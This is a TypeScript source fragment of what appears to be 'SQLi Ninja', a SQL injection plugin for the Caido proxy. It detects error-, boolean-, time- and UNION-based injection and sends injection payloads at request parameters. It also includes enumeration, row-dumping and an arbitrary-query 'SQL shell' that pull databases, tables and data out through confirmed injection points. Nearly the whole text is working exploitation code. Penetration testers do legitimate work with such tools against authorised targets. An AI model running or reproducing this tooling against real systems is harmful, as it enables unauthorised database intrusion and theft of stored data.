    // MERGE structured accessors (not just as a last resort). getRaw() can return the
    // request WITHOUT its body in this SDK, so JSON/body params must also be pulled from
    // getBody(); dedup keeps the raw-parsed ones. Query/cookie fill in if raw was empty.
    if (!rawHadBody) {
      const bodyStr = request.getBody?.()?.toText?.() || "";
      sendLog(`[DEBUG] structured body length: ${bodyStr.length}`, "verbose");
      if (bodyStr.trim()) {
        const trimmed = bodyStr.trim();
        let parsedJson = false;
        try {
          const json = JSON.parse(trimmed);
          for (const p of extractNestedParams(json)) add(p);
          parsedJson = true;
        } catch { /* not clean JSON */ }
        if (!parsedJson) {
          // Content-Type hint: if it claims JSON, surface why parse failed instead of
          // silently treating it as form data.
          const ctH = request.getHeader?.("Content-Type");
          const ct = (Array.isArray(ctH) ? ctH[0] : ctH || "").toLowerCase();
          if (ct.includes("application/json")) {
            sendLog(`[DEBUG] Content-Type is JSON but body did not parse — check for template placeholders`, "verbose");
          }
          try {
            for (const [name, value] of new URLSearchParams(trimmed).entries()) add({ name, value, type: "body" });
          } catch (e) {}
        }
      }
    }

    if (params.length === 0) {
      // Raw text missing entirely — rebuild query/cookie from structured accessors too.
      try {
        const path = request.getPath?.() || "";
        const urlObj = new URL("http://x" + path);
        for (const [name, value] of urlObj.searchParams.entries()) add({ name, value, type: "query" });
      } catch (e) {}
      const cookies = request.getHeader?.("Cookie") || [];
      const cookieStr = Array.isArray(cookies) ? cookies[0] : cookies;
      if (cookieStr) {
        for (const part of cookieStr.split(";")) {
          const [name, ...rest] = part.trim().split("=");
          if (name && name.length > 0) add({ name, value: rest.join("="), type: "cookie" });
        }
      }
    }

    sendLog(`[DEBUG] Total params found: ${params.length}`, "verbose");
    return params;
  });

  // Stop any running scan/enumeration/dump
  sdk.api.register("stopScan", async (_sdk: any, sessionId?: string) => {
    const sid = sessionId || "";
    abortedSessions.add(sid);
    _sendLog(`[!] Stop requested — finishing current request...`, "warn", sid);
    return { stopped: true };
  });

  // Main scan function with intelligent detection
  sdk.api.register("scan", async (_sdk: any, config: ScanConfig): Promise<Finding[]> => {
    const sessionId = config.sessionId || "";
    const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sessionId);
    abortedSessions.delete(sessionId);
    const { requestId, rawRequest, params, techniques, level, timeSec, verbose } = config;
    const findings: Finding[] = [];
    const prefixSuffixes = getPrefixSuffix(level);

    // Get the original request object for findings (only for saved requests)
    let originalRequest: any = null;
    if (requestId) {
      try {
        const reqResult = await sdk.requests.get(requestId);
        originalRequest = reqResult?.request;
      } catch (e) {}
    }

    sendLog(`╔══════════════════════════════════════════════════════════════╗`, "info");
    sendLog(`║           SQLi Ninja - Intelligent SQL Injection Scanner     ║`, "info");
    sendLog(`╚══════════════════════════════════════════════════════════════╝`, "info");
    sendLog(`[*] Starting scan with level ${level}`, "info");
    sendLog(`[*] Techniques: ${techniques.join(", ")}`, "info");
    {
      const nB = ghCandidates("boolean", "unknown").length, nE = ghCandidates("error", "unknown").length, nT = ghCandidates("time", "unknown").length;
      sendLog(`[*] Payload engine: ghauri matrix (${nB} boolean / ${nE} error / ${nT} time entries, per-entry boundaries)`, "info");
    }
    sendLog(`[*] Parameters: ${params.map(p => p.name).join(", ")}`, "info");
    sendLog(`[*] Prefix/suffix combinations: ${prefixSuffixes.length}`, "info");
    sendLog(``, "info");

    // Get baseline response. Be extra-patient here (5 attempts w/ backoff): the baseline is
    // the single gate that aborts the whole scan, so one slow response shouldn't kill it.
    sendLog(`[*] Fetching baseline response...`, "info");
    const baselineResp = await sendRequest(requestId, params[0]?.name || "", params[0]?.type || "query", params[0]?.value || "", rawRequest, sessionId, 5);
    if (!baselineResp) {
      if (isAborted(sessionId)) { sendLog(`[!] Scan stopped by user`, "warn"); return findings; }
      sendLog(`[!] Failed to get baseline response (target timed out or unreachable after 5 retries).`, "error");
      sendLog(`[i] testasp.vulnweb.com / slow targets: open the request in Replay and Send it once to confirm it responds, check the VDI can reach the host, then re-scan. Baseline now retries 5x with backoff; if it still times out the host is likely unreachable from the VDI, not just slow.`, "warn");
      return findings;
    }
    sendLog(`[+] Baseline: ${baselineResp.status} (${baselineResp.body.length} bytes, ${baselineResp.time}ms)`, "success");

    for (const param of params) {
      if (isAborted(sessionId)) { sendLog(`[!] Scan stopped by user`, "warn"); break; }
      sendLog(``, "info");
      sendLog(`[*] Testing parameter: ${param.name} (${param.type})`, "info");
      sendLog(`[*] Original value: ${param.value.substring(0, 50)}${param.value.length > 50 ? "..." : ""}`, "verbose");

      // Initial heuristic test — only count a DBMS error that the baseline did NOT already show
      sendLog(`[*] Running heuristic tests...`, "info");
      const heuristicPayloads = ["'", '"', ")", "')", '")'];
      let heuristicDbms = "unknown";
      const baseDbmsSig = detectDbms(baselineResp.body);

      for (const hp of heuristicPayloads) {
        const testVal = param.value + hp;
        const resp = await sendRequest(requestId, param.name, param.type, testVal, rawRequest, sessionId);
        if (resp) {
          const dbms = detectDbms(resp.body);
          if (dbms !== "unknown" && dbms !== baseDbmsSig) {
            heuristicDbms = dbms;
            sendLog(`[+] Heuristic test shows back-end DBMS could be: ${dbms.toUpperCase()}`, "success");
            break;
          }
        }
      }

      // Reflection probe: does this endpoint echo the submitted value back into the response?
      // If so, our markers/payloads appear in the body as plain reflection and must NOT be
      // mistaken for a DBMS error or extracted data. Gates the error/union marker checks below.
      let paramReflects = false;
      {
        const canary = `qZx${generateRandom()}${generateRandom()}Xzq`;
        const rp = await sendRequest(requestId, param.name, param.type, param.value + canary, rawRequest, sessionId);
        if (rp && rp.body.includes(canary)) {
          paramReflects = true;
          sendLog(`[i] Param "${param.name}" is reflected in the response — reflection guard ON (echoed markers won't count as SQLi).`, "warn");
        }
      }

      // Best-known DBMS for this param, refined as techniques confirm it (time-based is authoritative)
      let confirmedDbms = heuristicDbms;

      // Error-based testing — ghauri payload matrix (per-DBMS error families + boundaries)
      if (techniques.includes("error")) {
        sendLog(``, "info");
        sendLog(`[*] Testing ERROR-BASED injection...`, "info");
        const entries = ghCandidates("error", confirmedDbms);
        errDone:
        for (const entry of entries) {
          for (const { pref, suf } of ghBoundaries(entry, level)) {
            if (isAborted(sessionId)) break errDone;
            const probe = ghSubst(entry.payload, "plain", timeSec, param.value);
            const fullPayload = `${param.value}${pref}${probe}${suf}`;
            if (verbose) sendLog(`    [PAYLOAD] ${fullPayload.substring(0, 100)}${fullPayload.length > 100 ? "..." : ""}`, "verbose");

            const resp = await sendRequest(requestId, param.name, param.type, fullPayload, rawRequest, sessionId);
            if (!resp) continue;

            // Confirm: ghauri extraction marker surfaced (and absent from baseline) OR a
            // genuinely new DBMS error that the baseline did not already show.
            // Reflection guard: strip any verbatim echo of what we injected, and when the param
            // is known to reflect, never trust the raw marker (it's just our payload bounced back)
            // — only a real DBMS error signature (which reflection cannot fake) confirms.
            const injectedEcho = stripEchoes(resp.body, fullPayload, probe);
            const markerHit = !paramReflects
              && injectedEcho.includes(GH_ERROR_MARKER)
              && !baselineResp.body.includes(GH_ERROR_MARKER);
            const errConfirm = confirmErrorBased(baselineResp.body, injectedEcho, ghGroupToCode(entry.dbms));
            if (markerHit || errConfirm) {
              const detectedDbms = (errConfirm && errConfirm.dbms !== "unknown") ? errConfirm.dbms
                : (ghGroupToCode(entry.dbms) !== "unknown" ? ghGroupToCode(entry.dbms) : confirmedDbms);
              if (detectedDbms !== "unknown") confirmedDbms = detectedDbms;
              const evidence = markerHit
                ? `ghauri error marker '${GH_ERROR_MARKER}' reflected via injection`
                : errConfirm!.evidence;

              sendLog(`[+] VULNERABLE! Error-based SQLi confirmed`, "success");
              sendLog(`    Title: ${entry.title}`, "success");
              sendLog(`    DBMS: ${detectedDbms}`, "success");
              sendLog(`    Evidence: ${evidence}`, "success");
              sendLog(`    Payload: ${fullPayload.substring(0, 80)}...`, "success");

              const finding: Finding = {
                param: param.name, paramType: param.type, technique: "error", dbms: detectedDbms,
                payload: fullPayload, prefix: pref, suffix: suf, evidence, confidence: "high", title: entry.title,
              };
              findings.push(finding);
              recordVector({ requestId, rawRequest, param: finding.param, paramType: finding.paramType, technique: finding.technique, dbms: finding.dbms, prefix: finding.prefix, suffix: finding.suffix, origValue: param.value, vector: entry.vector, title: entry.title });

              try {
                if (originalRequest && sdk.findings && typeof sdk.findings.create === 'function') {
                  await sdk.findings.create({
                    title: `SQLi (Error-based) - ${param.name}`,
                    description: `SQL Injection vulnerability found in parameter "${param.name}".\n\nTechnique: Error-based\nDBMS: ${detectedDbms}\nTitle: ${entry.title}\nPayload: ${fullPayload}\n\nEvidence: ${evidence}`,
                    reporter: "SQLi Ninja",
                    request: originalRequest,
                  });
                  sendLog(`[+] Finding added to Caido Findings tab`, "success");
                }
              } catch (e: any) { /* Findings API may not be available */ }

              break errDone; // first confirmation ends the technique for this param
            }
          }
        }
      }

      // Boolean-based testing
      if (techniques.includes("boolean")) {
        sendLog(``, "info");
        sendLog(`[*] Testing BOOLEAN-BASED injection...`, "info");

        boolDone:
        for (const entry of ghCandidates("boolean", confirmedDbms)) {
          const title = entry.title;
          for (const { pref, suf } of ghBoundaries(entry, level)) {
              if (isAborted(sessionId)) break boolDone;
            const truePayloadStr = ghSubst(entry.payload, "true", timeSec, param.value);
            const falsePayloadStr = ghSubst(entry.payload, "false", timeSec, param.value);

            const fullTruePayload = `${param.value}${pref}${truePayloadStr}${suf}`;
            const fullFalsePayload = `${param.value}${pref}${falsePayloadStr}${suf}`;

            if (verbose) {
              sendLog(`    [TRUE]  ${fullTruePayload.substring(0, 80)}...`, "verbose");
              sendLog(`    [FALSE] ${fullFalsePayload.substring(0, 80)}...`, "verbose");
            }

            const trueResp = await sendRequest(requestId, param.name, param.type, fullTruePayload, rawRequest, sessionId);
            const falseResp = await sendRequest(requestId, param.name, param.type, fullFalsePayload, rawRequest, sessionId);

            if (!trueResp || !falseResp) continue;

            // Robust, stability-aware boolean confirmation (shift-robust metric + resampling).
            // A real boolean oracle requires: TRUE≈baseline, FALSE differs, AND the page is
            // DETERMINISTIC (two identical TRUE/FALSE requests reproduce) AND TRUE clearly ≠ FALSE.
            // This rejects dynamic pages (e.g. login forms) that randomly vary ~30-60% per request
            // and would otherwise be reported as false positives.
            const simTrueBase = pageSimilarity(baselineResp.body, trueResp.body);
            const simFalseBase = pageSimilarity(baselineResp.body, falseResp.body);
            let boolConfirmed = false;
            let selfSim = 0, sep = 0;
            if (simTrueBase >= 0.9 && (simTrueBase - simFalseBase) >= 0.15) {
              // Resample TRUE and FALSE to verify determinism before confirming.
              const true2 = await sendRequest(requestId, param.name, param.type, fullTruePayload, rawRequest, sessionId);
              const false2 = await sendRequest(requestId, param.name, param.type, fullFalsePayload, rawRequest, sessionId);
              selfSim = true2 ? pageSimilarity(trueResp.body, true2.body) : 0;
              const falseSelf = false2 ? pageSimilarity(falseResp.body, false2.body) : 0;
              sep = pageSimilarity(trueResp.body, falseResp.body);
              boolConfirmed = selfSim >= 0.9 && falseSelf >= 0.9 && (selfSim - sep) >= 0.15;
              if (!boolConfirmed && verbose) {
                sendLog(`    [skip] ${param.name}/${title}: not a stable boolean oracle (true-self ${(selfSim * 100) | 0}%, true/false ${(sep * 100) | 0}%) — dynamic page / false positive`, "verbose");
              }
            }
            if (boolConfirmed) {
              sendLog(`[+] VULNERABLE! Boolean-based SQLi confirmed`, "success");
              sendLog(`    Title: ${title}`, "success");
              sendLog(`    TRUE reproducible: ${(selfSim * 100).toFixed(1)}%, TRUE vs FALSE differ: ${((1 - sep) * 100).toFixed(1)}%`, "success");

              const finding: Finding = {
                param: param.name,
                paramType: param.type,
                technique: "boolean",
                dbms: confirmedDbms,
                payload: fullTruePayload,
                prefix: pref,
                suffix: suf,
                evidence: `TRUE self-similarity ${(selfSim * 100).toFixed(1)}%, TRUE vs FALSE ${(sep * 100).toFixed(1)}%`,
                confidence: "medium",
                title,
              };
              findings.push(finding); recordVector({ requestId, rawRequest, param: finding.param, paramType: finding.paramType, technique: finding.technique, dbms: finding.dbms, prefix: finding.prefix, suffix: finding.suffix, origValue: param.value, vector: entry.vector, title: entry.title });

              try {
                if (originalRequest && sdk.findings && typeof sdk.findings.create === 'function') {
                  await sdk.findings.create({
                    title: `SQLi (Boolean-based) - ${param.name}`,
                    description: `SQL Injection vulnerability found in parameter "${param.name}".\n\nTechnique: Boolean-based\nDBMS: ${confirmedDbms}\nTitle: ${title}\n\nTrue payload: ${fullTruePayload}\nFalse payload: ${fullFalsePayload}\n\nTRUE self-similarity: ${(selfSim * 100).toFixed(1)}%\nTRUE vs FALSE: ${(sep * 100).toFixed(1)}%`,
                    reporter: "SQLi Ninja",
                    request: originalRequest,
                  });
                  sendLog(`[+] Finding added to Caido Findings tab`, "success");
                }
              } catch (e: any) {
                // Findings API may not be available
              }

              break;
            }
          }
          if (findings.some(f => f.param === param.name && f.technique === "boolean")) break;
        }
      }

      // Time-based testing
      if (techniques.includes("time")) {
        sendLog(``, "info");
        sendLog(`[*] Testing TIME-BASED injection (${timeSec}s delay)...`, "info");

        const timeBoundaries = (entry: GhEntry) => entry.comments.slice(0, level === 1 ? 3 : level === 2 ? 6 : 10);
        timeDone:
        for (const entry of ghCandidates("time", confirmedDbms)) {
          const title = entry.title;
          for (const { pref, suf } of timeBoundaries(entry)) {
            if (isAborted(sessionId)) break timeDone;
            const payloadStr = ghSubst(entry.payload, "plain", timeSec, param.value);
            const fullPayload = `${param.value}${pref}${payloadStr}${suf}`;

            if (verbose) sendLog(`    [PAYLOAD] ${fullPayload.substring(0, 80)}...`, "verbose");

            const resp = await sendRequest(requestId, param.name, param.type, fullPayload, rawRequest, sessionId);
            if (!resp) continue;

            const expectedDelay = timeSec * 1000;
            const tolerance = 1500; // 1.5s tolerance

            if (resp.time >= expectedDelay - tolerance && resp.time <= expectedDelay + (timeSec * 1000)) {
              sendLog(`    [*] Potential delay detected (${resp.time}ms), confirming...`, "warn");

              const confirmResp = await sendRequest(requestId, param.name, param.type, fullPayload, rawRequest, sessionId);
              if (confirmResp && confirmResp.time >= expectedDelay - tolerance) {
                // Time-based payloads name the DBMS authoritatively.
                const timeDbms = ghGroupToCode(entry.dbms);
                if (timeDbms !== "unknown") confirmedDbms = timeDbms;

                sendLog(`[+] VULNERABLE! Time-based SQLi confirmed`, "success");
                sendLog(`    Title: ${title}`, "success");
                sendLog(`    DBMS: ${confirmedDbms}`, "success");
                sendLog(`    Delay: ${confirmResp.time}ms (expected ~${expectedDelay}ms)`, "success");

                const finding: Finding = {
                  param: param.name, paramType: param.type, technique: "time", dbms: confirmedDbms,
                  payload: fullPayload, prefix: pref, suffix: suf,
                  evidence: `Response delayed by ${confirmResp.time}ms (expected ${expectedDelay}ms)`,
                  confidence: "high", title,
                };
                findings.push(finding);
                recordVector({ requestId, rawRequest, param: finding.param, paramType: finding.paramType, technique: finding.technique, dbms: finding.dbms, prefix: finding.prefix, suffix: finding.suffix, origValue: param.value, vector: entry.vector, title: entry.title });

                try {
                  if (originalRequest && sdk.findings && typeof sdk.findings.create === 'function') {
                    await sdk.findings.create({
                      title: `SQLi (Time-based) - ${param.name}`,
                      description: `SQL Injection vulnerability found in parameter "${param.name}".\n\nTechnique: Time-based blind\nDBMS: ${confirmedDbms}\nTitle: ${title}\nPayload: ${fullPayload}\n\nResponse delay: ${confirmResp.time}ms (expected ~${expectedDelay}ms)`,
                      reporter: "SQLi Ninja",
                      request: originalRequest,
                    });
                    sendLog(`[+] Finding added to Caido Findings tab`, "success");
                  }
                } catch (e: any) { /* Findings API may not be available */ }

                break timeDone;
              }
            }
          }
        }
      }

      // UNION-based testing
      if (techniques.includes("union")) {
        sendLog(``, "info");
        sendLog(`[*] Testing UNION-BASED injection...`, "info");

        for (const unionPayload of UNION_PAYLOADS) {
          for (const { pref, suf } of prefixSuffixes.slice(0, level === 1 ? 4 : 8)) {
              if (isAborted(sessionId)) break;
            const fullPayload = `${param.value}${pref}${unionPayload}${suf}`;

            if (verbose) {
              sendLog(`    [PAYLOAD] ${fullPayload}`, "verbose");
            }

            const resp = await sendRequest(requestId, param.name, param.type, fullPayload, rawRequest, sessionId);
            if (!resp) continue;

            // Check if NULL values appear in response or if response structure changes
            const nullCount = (unionPayload.match(/NULL/g) || []).length;
            const comparison = compareResponses(baselineResp.body, resp.body);

            if (!comparison.similar && resp.status === 200) {
              // Try to find column count by looking for successful UNION
              const columnMatch = resp.body.match(/NULL/gi);

              sendLog(`    [*] Response differs with ${nullCount} columns, investigating...`, "info");

              // Test with version extraction
              const versionPayload = unionPayload.replace("NULL", heuristicDbms === "mysql" ? "VERSION()" :
                heuristicDbms === "mssql" ? "@@VERSION" :
                heuristicDbms === "postgresql" ? "version()" : "NULL");

              const versionFullPayload = `${param.value}${pref}${versionPayload}${suf}`;
              const versionResp = await sendRequest(requestId, param.name, param.type, versionFullPayload, rawRequest, sessionId);

              // Reflection guard: strip any echo of the payload first, so an echoed `@@VERSION`
              // (or the raw value) can't masquerade as a real version banner.
              const versionBody = versionResp ? stripEchoes(versionResp.body, versionFullPayload, versionPayload) : "";
              if (versionResp && versionBody.match(/\d+\.\d+\.\d+|MariaDB|PostgreSQL|Microsoft|Oracle/i)) {
                sendLog(`[+] VULNERABLE! UNION-based SQLi confirmed`, "success");
                sendLog(`    Columns: ${nullCount}`, "success");

                const finding: Finding = {
                  param: param.name,
                  paramType: param.type,
                  technique: "union",
                  dbms: heuristicDbms,
                  payload: versionFullPayload,
                  prefix: pref,
                  suffix: suf,
                  evidence: `UNION with ${nullCount} columns successful`,
                  confidence: "high",
                  title: `UNION-based (${nullCount} columns)`,
                };
                findings.push(finding); recordVector({ requestId, rawRequest, param: finding.param, paramType: finding.paramType, technique: finding.technique, dbms: finding.dbms, prefix: finding.prefix, suffix: finding.suffix, origValue: param.value });

                try {
                  if (originalRequest && sdk.findings && typeof sdk.findings.create === 'function') {
                    await sdk.findings.create({
                      title: `SQLi (UNION-based) - ${param.name}`,
                      description: `SQL Injection vulnerability found in parameter "${param.name}".\n\nTechnique: UNION-based\nDBMS: ${heuristicDbms}\nColumns: ${nullCount}\nPayload: ${versionFullPayload}`,
                      reporter: "SQLi Ninja",
                      request: originalRequest,
                    });
                    sendLog(`[+] Finding added to Caido Findings tab`, "success");
                  }
                } catch (e: any) {
                  // Findings API may not be available
                }

                break;
              }
            }
          }
          if (findings.some(f => f.param === param.name && f.technique === "union")) break;
        }
      }
    }

    // Summary
    sendLog(``, "info");
    sendLog(`╔══════════════════════════════════════════════════════════════╗`, "info");
    sendLog(`║                      SCAN COMPLETE                           ║`, "info");
    sendLog(`╚══════════════════════════════════════════════════════════════╝`, "info");
    sendLog(`[*] Parameters tested: ${params.length}`, "info");
    sendLog(`[*] Vulnerabilities found: ${findings.length}`, findings.length > 0 ? "success" : "info");

    if (findings.length > 0) {
      sendLog(``, "info");
      sendLog(`[+] FINDINGS:`, "success");
      for (const f of findings) {
        sendLog(`    - ${f.param}: ${f.technique} (${f.dbms}) - ${f.title}`, "success");
      }
    }

    return findings;
  });

  // List confirmed injection points for a request (so UI can pick one)
  sdk.api.register("getVectors", async (_sdk: any, requestId: string) => {
    return Object.values(confirmedVectors)
      .filter(v => (v.requestId || "") === (requestId || "") || (!requestId && v.requestId === ""))
      .map(v => ({ param: v.param, paramType: v.paramType, technique: v.technique, dbms: v.dbms }));
  });

  // Enumerate: banner | user | currentdb | hostname | dbs | tables | columns
  sdk.api.register("enumerate", async (_sdk: any, cfg: { requestId: string; param?: string; kind: string; db?: string; table?: string; timeSec?: number; rowCap?: number; sessionId?: string }) => {
    const sid = cfg.sessionId || "";
    const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
    abortedSessions.delete(sid);
    const timeSec = cfg.timeSec || 5;
    const rowCap = cfg.rowCap || 50;

    sendLog(``, "info");
    sendLog(`[*] Enumerating ${cfg.kind}...`, "info");
    const prep = await prepareExtraction(cfg.requestId, cfg.param, timeSec, sid);
    if (!prep) return [];
    const { v, refs } = prep;
    const dbms = (v.dbms && v.dbms !== "unknown") ? v.dbms : "mysql";
    const q = (ENUM_QUERIES as any)[dbms] || ENUM_QUERIES.mysql;

    const single = async (sql: string) => {
      const val = await extractValue(v, `(${sql})`, refs, timeSec, sid);
      sendLog(`[+] ${cfg.kind}: ${val}`, "success");
      return [val];
    };

    try {
      switch (cfg.kind) {
        case "banner": return await single(q.version);
        case "user": return await single(q.user || "SELECT USER()");
        case "currentdb": return await single(dbms === "mysql" ? "SELECT DATABASE()" : dbms === "mssql" ? "SELECT DB_NAME()" : dbms === "postgresql" ? "SELECT current_database()" : "SELECT USER FROM DUAL");
        case "hostname": return await single(q.hostname || "SELECT @@hostname");
        case "dbs": {
          const rows = await extractMultiRow(v, q.databases, refs, timeSec, rowCap, sid);
          sendLog(`[+] Databases (${rows.length}): ${rows.join(", ")}`, "success");
          return rows;
        }
        case "tables": {
          const sql = q.tables.replace(/\[DB\]/g, cfg.db || "");
          const rows = await extractMultiRow(v, sql, refs, timeSec, rowCap, sid);
          sendLog(`[+] Tables in ${cfg.db} (${rows.length}): ${rows.join(", ")}`, "success");
          return rows;
        }
        case "columns": {
          const sql = q.columns.replace(/\[DB\]/g, cfg.db || "").replace(/\[TABLE\]/g, cfg.table || "");
          const rows = await extractMultiRow(v, sql, refs, timeSec, rowCap, sid);
          sendLog(`[+] Columns in ${cfg.table} (${rows.length}): ${rows.join(", ")}`, "success");
          return rows;
        }
        default: return [];
      }
    } catch (e: any) {
      sendLog(`[!] Enumerate error: ${e?.message || e}`, "error");
      return [];
    }
  });

  // Dump rows for chosen columns of a table
  sdk.api.register("dump", async (_sdk: any, cfg: { requestId: string; param?: string; db?: string; table: string; columns: string[]; timeSec?: number; rowCap?: number; sessionId?: string }) => {
    const sid = cfg.sessionId || "";
    const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
    abortedSessions.delete(sid);
    const timeSec = cfg.timeSec || 5;
    const rowCap = cfg.rowCap || 20;
    const cols = cfg.columns;
    const tableRef = cfg.db ? `${cfg.db}.${cfg.table}` : cfg.table;

    sendLog(``, "info");
    sendLog(`[*] Dumping ${cols.join(",")} from ${tableRef} (cap ${rowCap})`, "info");

    const prep = await prepareExtraction(cfg.requestId, cfg.param, timeSec, sid);
    if (!prep) return { columns: cols, rows: [] };
    const { v, refs } = prep;
    const dbms = (v.dbms && v.dbms !== "unknown") ? v.dbms : "mysql";

    // Concatenate selected columns per row with a field separator 0x7f, then split
    const sep = String.fromCharCode(127);
    const concatCols = dbms === "mysql"
      ? `CONCAT_WS(0x7f,${cols.join(",")})`
      : dbms === "mssql"
      ? cols.map(c => `CAST(${c} AS NVARCHAR(MAX))`).join("+CHAR(127)+")
      : dbms === "postgresql"
      ? cols.map(c => `COALESCE(${c}::text,'')`).join("||CHR(127)||")
      : cols.map(c => `${c}`).join("||CHR(127)||");
    const baseSql = `SELECT ${concatCols} FROM ${tableRef}`;

    try {
      const rawRows = await extractMultiRow(v, baseSql, refs, timeSec, rowCap, sid);
      const rows = rawRows.map(r => r.split(sep));
      sendLog(`[+] Dumped ${rows.length} row(s)`, "success");
      return { columns: cols, rows };
    } catch (e: any) {
      sendLog(`[!] Dump error: ${e?.message || e}`, "error");
      return { columns: cols, rows: [] };
    }
  });

  // SQL shell: run an arbitrary scalar SELECT and return the value
  sdk.api.register("sqlShell", async (_sdk: any, cfg: { requestId: string; param?: string; query: string; timeSec?: number; sessionId?: string }) => {
    const sid = cfg.sessionId || "";
    const sendLog = (m: string, t: string = "info") => _sendLog(m, t, sid);
    abortedSessions.delete(sid);
    const timeSec = cfg.timeSec || 5;
    sendLog(``, "info");
    sendLog(`sqli> ${cfg.query}`, "info");

    const prep = await prepareExtraction(cfg.requestId, cfg.param, timeSec, sid);
    if (!prep) return "";
    const { v, refs } = prep;
    try {
      // Wrap as a scalar subquery
      const expr = `(${cfg.query.replace(/;+\s*$/, "")})`;
      const val = await extractValue(v, expr, refs, timeSec, sid);
      sendLog(`[+] ${val}`, "success");
      return val;
    } catch (e: any) {
      sendLog(`[!] SQL shell error: ${e?.message || e}`, "error");
      return "";
    }
  });
}
